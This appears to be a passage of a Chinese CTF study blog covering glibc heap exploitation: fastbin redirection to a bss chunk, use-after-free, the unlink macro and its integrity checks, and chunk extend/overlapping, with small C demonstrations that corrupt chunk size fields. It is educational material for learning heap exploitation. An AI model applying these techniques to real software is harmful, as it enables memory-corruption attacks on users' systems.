<p><strong>第三次malloc申请后chunk1再一次被启用，main_arena指向chunk的fd指向的bss_chunk</strong></p>
<p><strong>那么在第四次malloc申请的时候此时main_arena指向的bss_chunk就会被启用</strong></p>
</blockquote>
<p>虽然bss_chunk并不是在内存中正常申请的chunk，但是由于我们可以修改chunk1的fd，使他指向bss_chunk，那么即使bss_chunk位于bss段，也会被当作一个chunk来被启用</p>
<p>那么在程序第31行代码中chunk_b其实被赋予的就是bss_chunk的结构体指针，所以在第32行输出的时候实际输出的是bss_chunk的chunk地址</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/11/uaf/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/11/uaf/" class="post-title-link" itemprop="url">uaf</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-11-11 22:11:23" itemprop="dateCreated datePublished" datetime="2024-11-11T22:11:23+08:00">2024-11-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-11-15 20:50:37" itemprop="dateModified" datetime="2024-11-15T20:50:37+08:00">2024-11-15</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Use After Free<br>原理：</p>
<p>使用被释放的内存块。其实当一个内存块被释放之后重新使用有如下几种情况：</p>
<blockquote>
<ol>
<li><strong>内存块被释放后，其对应的指针被设置为NULL，再次使用时程序会崩溃</strong></li>
<li><strong>内存块被释放后，其对应的指针没有被设置为NULL，在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序有可能可以正常运转</strong></li>
<li><strong>内存块被释放后，其对应的指针没有被设置为NULL，但是在下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能出现问题</strong></li>
</ol>
</blockquote>
<p>我们一般所指的Use After Free漏洞主要是后两种，一般将释放后没有被设置为NULL的内存指针为<strong>dangling pointer</strong></p>
<p>Tips：</p>
<blockquote>
<p>有且仅有指针不置空，才能做到对其的二次利用（free可以，但指针置空不可）。</p>
<p>先被释放的往往最后启用，最后释放往往最先启用。</p>
<p>被释放后，user_date的内容不会被清除，会被保留。（可利用此点‘更改’不能改动的chunk）</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/10/Unlink/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/10/Unlink/" class="post-title-link" itemprop="url">Unlink</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2024-11-10 20:58:44 / 修改时间：21:06:36" itemprop="dateCreated datePublished" datetime="2024-11-10T20:58:44+08:00">2024-11-10</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Unlink<br>Unlink是什么<br>在讲那个wiki上被转发烂了的chunk图之前有两个点先解决一下：</p>
<p>unlink是什么<br>什么时候执行了unlink<br>这两个点也是我在初期一直都很困惑的地方，直到翻看了libc的源码（可以在这里下载，我下载的是2.23），在malloc.c中找到了unlink。unlink其实是libc中定义的一个宏，定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#define unlink(AV, P, BK, FD) &#123;                                            </span><br><span class="line">    FD = P-&gt;fd;								      </span><br><span class="line">    BK = P-&gt;bk;								      </span><br><span class="line">    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      </span><br><span class="line">      malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  </span><br><span class="line">    else &#123;								      </span><br><span class="line">        FD-&gt;bk = BK;							      </span><br><span class="line">        BK-&gt;fd = FD;							      </span><br><span class="line">        if (!in_smallbin_range (P-&gt;size)				      </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;		      </span><br><span class="line">	    if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)	      </span><br><span class="line">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    </span><br><span class="line">	      malloc_printerr (check_action,				      </span><br><span class="line">			       &quot;corrupted double-linked list (not small)&quot;,    </span><br><span class="line">			       P, AV);					      </span><br><span class="line">            if (FD-&gt;fd_nextsize == NULL) &#123;				      </span><br><span class="line">                if (P-&gt;fd_nextsize == P)				      </span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      </span><br><span class="line">                else &#123;							      </span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      </span><br><span class="line">                  &#125;							      </span><br><span class="line">              &#125; else &#123;							      </span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      </span><br><span class="line">              &#125;								      </span><br><span class="line">          &#125;								      </span><br><span class="line">      &#125;									      </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那什么时候执行了unlink呢？在执行free()函数时执行了 _int_free()函数，在_int_free()函数中调用了unlink宏，大概的意思如下（注意_int_free()是函数不是宏）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#define unlink(AV, P, BK, FD)</span><br><span class="line">static void _int_free (mstate av, mchunkptr p, int have_lock)</span><br><span class="line">free()&#123;</span><br><span class="line">	_int_free()&#123;</span><br><span class="line">		unlink();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>堆释放<br>好了关于unlink的部分先暂停一下，这里我们需要回顾一下调用free()函数堆释放这部分的知识</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//gcc -g test.c -o test</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line"> void main()&#123;</span><br><span class="line">         long *hollk1 = malloc(0x80);</span><br><span class="line">         long *first_chunk = malloc(0x80);</span><br><span class="line">         long *hollk3 = malloc(0x80);</span><br><span class="line">         long *second_chunk = malloc(0x80);</span><br><span class="line">         long *hollk5 = malloc(0x80);</span><br><span class="line">         long *third_chunk = malloc(0x80);</span><br><span class="line">         long *hollk7 = malloc(0x80);</span><br><span class="line">         </span><br><span class="line">         free(first_chunk);</span><br><span class="line">        free(second_chunk);</span><br><span class="line">         free(third_chunk);</span><br><span class="line">  </span><br><span class="line">         return 0;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>举一个例子，这里申请了7个chunk，接着依次释放了first_chunk、second_chunk、third_chunk。这里为什么释放这几个chunk呢，因为地址相邻的chunk释放之后会进行合并，地址不相邻的时候不会合并。由于申请的是0x80的chunk，所以在释放之后不会进fastbin而是先进unsortbin。我们用gdb打开编译好的例子，因为使用了-g参数，所以我们在第17行使用命令b 17下断点，接下来让程序跑起来，使用命令bin我们看一下双向链表中的排列结构：</p>
<p>离近点看！ 可以模糊的看到已经有三个chunk_free进入了unsortbin。那么这三个chunk_free从右向左分别对应着first_chunk、second_chunk、third_chunk，我们使用heap命令查看一下这几个chunk：</p>
<p>这几个释放的chunk已经按照unsortbin中的顺序排列。这里主要看每一个chunk的fd、bk：</p>
<p><em>first_bk -&gt; second</em><br><em>second_fd -&gt; first 、 second_bk -&gt; third</em><br><em>third_fd -&gt; second&#96;</em></p>
<p>unlink过程及检查<br>下面呢给出wiki上的链接，说实话wiki上的图和说明我是真的没看懂。。。。。所以我按照字节的例子和理解写出来：</p>
<p>wiki链接：<a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/</a></p>
<p>wiki中unlink关键执行了如下的步骤：</p>
<p>FD &#x3D; P -&gt; fd &#x3D; target addr -12<br>BK &#x3D; P -&gt; bk &#x3D; expect value<br>FD -&gt; bk &#x3D; BK，即 *(target addr - 12 + 12) &#x3D; BK &#x3D; expect value<br>BK -&gt; fd &#x3D; FD，即 *(expect value + 8) &#x3D; FD &#x3D; target addr - 12<br>这后面的target、expect什么的我就不知道是啥了，感觉好像没什么用处。。。。。</p>
<p>我自己的理解<br>在此声明这里是我个人的理解，没有说wiki不对什么的，而且也是在wiki的基础上做了一些更加通俗易懂的变化</p>
<p>还是用前面堆释放的例子，依次释放了first_chunk、second_chunk、third_chunk，也就是说首先释放的是first，然后释放的是second，最后释放的是third。在双链表中的结构如下：</p>
<p>个人的理解unlink其实是想把second_chunk摘掉，那怎么摘呢？</p>
<p>在前面堆释放部分我们讲过fd其实是前一个被释放chunk的prev_size地址，bk是后一个被释放的chunk的prev_size地址，所以：</p>
<p>如果second_chunk被摘掉，那么就会变成下面这样：</p>
<p>由于first_chunk是最开始被释放的，所以first_chunk相对于third_chunk是前一个被释放的块。同样的third_chunk是之后释放的，所以third_chunk相对于first_chunk是后一个被释放的块，所以：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">first_bk = third_prev_addr</span><br><span class="line">third_fd = first_prev_addr</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>所以我的理解中对应着wiki的表现形式就是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">second_fd = first_prev_addr</span><br><span class="line">second_bk = third_prev_addr</span><br><span class="line">first_bk = third_prev_addr </span><br><span class="line">third_fd = first_prev_addr </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>※※※※※※※※执行流程有先后顺序※※※※※※※※</p>
<p>chunk状态检查<br>现在我们用的大多数linux都会对chunk状态进行检查，以免造成二次释放或者二次申请的问题。但是恰恰是这个检查的流程本身就存在一些问题，能够让我们进行利用。回顾一下以往我们做的题，大部分都是顺着原有的执行流程走，但是通过修改执行所用的数据来改变执行走向。unlink同样可以以这种方式进行利用，由于unlink是在free()函数中调用的，所以我们只看chunk空闲时都需要检查写什么</p>
<p>我们还是拿前面的例子来说：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> <span class="comment">//gcc -g test.c -o test</span></span><br><span class="line"> <span class="number">2</span> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="number">3</span> </span><br><span class="line"> <span class="number">4</span> <span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"> <span class="number">5</span>         <span class="type">long</span> *hollk1 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"> <span class="number">6</span>         <span class="type">long</span> *first_chunk = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"> <span class="number">7</span>         <span class="type">long</span> *hollk3 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"> <span class="number">8</span>         <span class="type">long</span> *second_chunk = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"> <span class="number">9</span>         <span class="type">long</span> *hollk5 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="number">10</span>         <span class="type">long</span> *third_chunk = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="number">11</span>         <span class="type">long</span> *hollk7 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="number">12</span>         </span><br><span class="line"><span class="number">13</span>         <span class="built_in">free</span>(first_chunk);</span><br><span class="line"><span class="number">14</span>         <span class="built_in">free</span>(second_chunk);</span><br><span class="line"><span class="number">15</span>         <span class="built_in">free</span>(third_chunk);</span><br><span class="line"><span class="number">16</span>  </span><br><span class="line"><span class="number">17</span>         <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">18</span> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这次我们在第17行下断点，并且查看一下second_chunk：</p>
<p>检查1：检查与被释放chunk相邻高地址的chunk的prevsize的值是否等于被释放chunk的size大小</p>
<p>可以看左图绿色框中的内容，上面绿色框中的内容是second_chunk的size大小，下面绿色框中的内容是hollk5的prev_size，这两个绿色框中的数值是需要相等的（忽略P标志位）。在wiki上我记得在基础部分有讲过，如果一个块属于空闲状态，那么相邻高地址块的prev_size为前一个块的大小</p>
<p>检查2：检查与被释放chunk相邻高地址的chunk的size的P标志位是否为0</p>
<p>可以看左图蓝色框中的内容，这里是hollk5的size，hollk5的size的P标志位为0，代表着它前一个chunk(second_chunk)为空闲状态</p>
<p>检查3：检查前后被释放chunk的fd和bk</p>
<p>可以看左图红色框中的内容，这里是second_chunk的fd和bk。首先看fd，它指向的位置就是前一个被释放的块first_chunk，这里需要检查的是first_chunk的bk是否指向second_chunk的地址。再看second_chunk的bk，它指向的是后一个被释放的块third_chunk，这里需要检查的是third_chunk的fd是否指向second_chunk的地址</p>
<p>以上三点就是检查chunk是否空闲的三大标准。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/28/Overlapping/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/28/Overlapping/" class="post-title-link" itemprop="url">Overlapping</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2024-10-28 19:32:08 / 修改时间：20:57:08" itemprop="dateCreated datePublished" datetime="2024-10-28T19:32:08+08:00">2024-10-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Chunk-Extend-and-Overlapping（堆重叠）"><a href="#Chunk-Extend-and-Overlapping（堆重叠）" class="headerlink" title="Chunk Extend and Overlapping（堆重叠）"></a>Chunk Extend and Overlapping（堆重叠）</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。这种利用方法需要以下的时机和条件：</p>
<ul>
<li>程序中存在基于堆的漏洞</li>
<li>漏洞可以控制 chunk header 中的数据</li>
</ul>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>chunk extend 技术能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使用的各种宏。</p>
<p>在 ptmalloc 中，获取 chunk 块大小的操作如下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* Get size, ignoring use bits */</span><br><span class="line"><span class="comment">#define chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line">/* Like chunksize, but do <span class="keyword">not</span> mask SIZE_BITS.  */</span><br><span class="line"><span class="comment">#define chunksize_nomask(p) ((p)-&gt;mchunk_size)</span></span><br></pre></td></tr></table></figure>

<p>一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分。</p>
<p>在 ptmalloc 中，获取下一 chunk 块地址的操作如下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/* Ptr to <span class="built_in">next</span> physical malloc_chunk. */</span><br><span class="line"><span class="comment">#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span></span><br></pre></td></tr></table></figure>

<p>即使用当前块指针加上当前块大小。</p>
<p>在 ptmalloc 中，获取前一个 chunk 信息的操作如下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* Size of the chunk below P.  Only valid <span class="keyword">if</span> prev_inuse (P).  */</span><br><span class="line"><span class="comment">#define prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line">/* Ptr to previous physical malloc_chunk.  Only valid <span class="keyword">if</span> prev_inuse (P).  */</span><br><span class="line"><span class="comment">#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span></span><br></pre></td></tr></table></figure>

<h5 id="即通过-malloc-chunk-prev-size-获取前一块大小，然后使用本-chunk-地址减去所得大小（可以通过改变prev-size来改变其指针所指位置）。"><a href="#即通过-malloc-chunk-prev-size-获取前一块大小，然后使用本-chunk-地址减去所得大小（可以通过改变prev-size来改变其指针所指位置）。" class="headerlink" title="即通过 malloc_chunk-&gt;prev_size 获取前一块大小，然后使用本 chunk 地址减去所得大小（可以通过改变prev_size来改变其指针所指位置）。"></a><strong>即通过 malloc_chunk-&gt;prev_size 获取前一块大小，然后使用本 chunk 地址减去所得大小（可以通过改变prev_size来改变其指针所指位置）。</strong></h5><p>在 ptmalloc，判断当前 chunk 是否是 use 状态的操作如下：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define inuse(p)</span></span><br><span class="line">    ((((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br></pre></td></tr></table></figure>

<h5 id="即查看下一-chunk-的-prev-inuse-域，而下一块地址又如我们前面所述是根据当前-chunk-的-size-计算得出的。"><a href="#即查看下一-chunk-的-prev-inuse-域，而下一块地址又如我们前面所述是根据当前-chunk-的-size-计算得出的。" class="headerlink" title="即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。"></a><strong>即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。</strong></h5><p>通过上面几个宏可以看出，ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对 chunk 的前后块进行定位。简而言之，chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的。</p>
<p>与 chunk extend 类似的还有一种称为 chunk shrink 的操作。这里只介绍 chunk extend 的利用。</p>
<h2 id="基本示例-1：对-inuse-的-fastbin-进行-extend"><a href="#基本示例-1：对-inuse-的-fastbin-进行-extend" class="headerlink" title="基本示例 1：对 inuse 的 fastbin 进行 extend"></a>基本示例 1：对 inuse 的 fastbin 进行 extend</h2><p>简单来说，该利用的效果是通过更改第一个块的大小来控制第二个块的内容。 <strong>注意，我们的示例都是在 64 位的程序。如果想在 32 位下进行测试，可以把 8 字节偏移改为 4 字节</strong>。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> main(void)</span><br><span class="line">&#123;</span><br><span class="line">    void *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=malloc(<span class="number">0x10</span>);//分配第一个<span class="number">0x10</span>的chunk</span><br><span class="line">    malloc(<span class="number">0x10</span>);//分配第二个<span class="number">0x10</span>的chunk</span><br><span class="line"></span><br><span class="line">    *(long long *)((long long)ptr-<span class="number">0x8</span>)=<span class="number">0x41</span>;// 修改第一个块的size域</span><br><span class="line"></span><br><span class="line">    free(ptr);</span><br><span class="line">    ptr1=malloc(<span class="number">0x30</span>);// 实现 extend，控制了第二个块的内容</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当两个 malloc 语句执行之后，堆的内存分布如下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span> &lt;=== chunk <span class="number">1</span></span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span> &lt;=== chunk <span class="number">2</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020fc1</span> &lt;=== top chunk</span><br></pre></td></tr></table></figure>

<p>之后，我们把 chunk1 的 size 域更改为 0x41，0x41 是因为 chunk 的 size 域包含了用户控制的大小和 header 的大小。如上所示正好大小为 0x40。在题目中这一步可以由堆溢出得到。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000041</span> &lt;=== 篡改大小</span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020fc1</span> </span><br></pre></td></tr></table></figure>

<p>执行 free 之后，我们可以看到 chunk2 与 chunk1 合成一个 0x40 大小的 chunk，一起释放了。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Fastbins[idx=<span class="number">0</span>, size=<span class="number">0x10</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">1</span>, size=<span class="number">0x20</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">2</span>, size=<span class="number">0x30</span>]  ←  Chunk(addr=<span class="number">0x602010</span>, size=<span class="number">0x40</span>, flags=PREV_INUSE) </span><br><span class="line">Fastbins[idx=<span class="number">3</span>, size=<span class="number">0x40</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">4</span>, size=<span class="number">0x50</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">5</span>, size=<span class="number">0x60</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">6</span>, size=<span class="number">0x70</span>] <span class="number">0x00</span></span><br></pre></td></tr></table></figure>

<p>之后我们通过 malloc(0x30) 得到 chunk1+chunk2 的块，此时就可以直接控制 chunk2 中的内容，我们也把这种状态称为 overlapping chunk。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">call   <span class="number">0x400450</span> &lt;malloc@plt&gt;</span><br><span class="line">mov    QWORD PTR [rbp-<span class="number">0x8</span>], rax</span><br><span class="line"></span><br><span class="line">rax = <span class="number">0x602010</span></span><br></pre></td></tr></table></figure>



<h2 id="基本示例-2：对-inuse-的-smallbin-进行-extend"><a href="#基本示例-2：对-inuse-的-smallbin-进行-extend" class="headerlink" title="基本示例 2：对 inuse 的 smallbin 进行 extend"></a>基本示例 2：对 inuse 的 smallbin 进行 extend</h2><p>通过之前深入理解堆的实现部分的内容，我们得知处于 fastbin 范围的 chunk 释放后会被置入 fastbin 链表中，而不处于这个范围的 chunk 被释放后会被置于 unsorted bin 链表中。 以下这个示例中，我们使用 0x80 这个大小来分配堆（作为对比，fastbin 默认的最大的 chunk 可使用范围是 0x70）</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    void *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=malloc(<span class="number">0x80</span>);//分配第一个 <span class="number">0x80</span> 的chunk1</span><br><span class="line">    malloc(<span class="number">0x10</span>); //分配第二个 <span class="number">0x10</span> 的chunk2</span><br><span class="line">    malloc(<span class="number">0x10</span>); //防止与top chunk合并</span><br><span class="line"></span><br><span class="line">    *(<span class="built_in">int</span> *)((<span class="built_in">int</span>)ptr-<span class="number">0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    free(ptr);</span><br><span class="line">    ptr1=malloc(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

